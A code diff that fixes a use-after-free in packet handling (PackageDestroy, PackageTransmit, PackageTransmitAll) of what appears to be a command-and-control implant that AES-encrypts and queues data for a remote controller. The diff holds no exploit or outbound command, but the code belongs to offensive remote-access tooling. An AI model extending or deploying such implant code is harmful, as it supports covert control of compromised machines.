@@ -176,8 +176,22 @@ PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
 VOID PackageDestroy(
     IN PPACKAGE Package
 ) {
+    PPACKAGE Pkg = Instance.Packages;
+
     if ( Package )
     {
+        // make sure the package is not on the Instance.Packages list, avoid UAF
+        while ( Pkg )
+        {
+            if ( Package == Pkg )
+            {
+                PUTS_DONT_SEND( "Package can't be destroyed, is on Instance.Packages list" )
+                return;
+            }
+
+            Pkg = Pkg->Next;
+        }
+
         if ( Package->Buffer )
         {
             MemSet( Package->Buffer, 0, Package->Length );
@@ -231,7 +245,7 @@ BOOL PackageTransmitNow(
         }
 
         if ( Package->Destroy ) {
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
         } else if ( Package->Encrypt ) {
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
@@ -249,6 +263,10 @@ VOID PackageTransmit(
 ) {
     PPACKAGE List = NULL;
 
+    if ( ! Package ) {
+        return;
+    }
+        
     if ( ! Instance.Packages )
     {
         Instance.Packages = Package;
@@ -347,7 +365,7 @@ BOOL PackageTransmitAll(
 
                     // remove the entry if requried
                     if ( Entry->Destroy ) {
-                        PackageDestroy( Entry );
+                        PackageDestroy( Entry ); Entry = NULL;
                     }
 
                     Entry = Instance.Packages;
@@ -362,7 +380,7 @@ BOOL PackageTransmitAll(
 
                         // remove the entry if requried
                         if ( Entry->Destroy ) {
-                            PackageDestroy( Entry );
+                            PackageDestroy( Entry ); Entry = NULL;
                         }
 
                         Entry = Prev->Next;
@@ -391,7 +409,7 @@ BOOL PackageTransmitAll(
         }
     }
 
-    PackageDestroy( Package );
+    PackageDestroy( Package ); Package = NULL;
 
     return Success;
 }
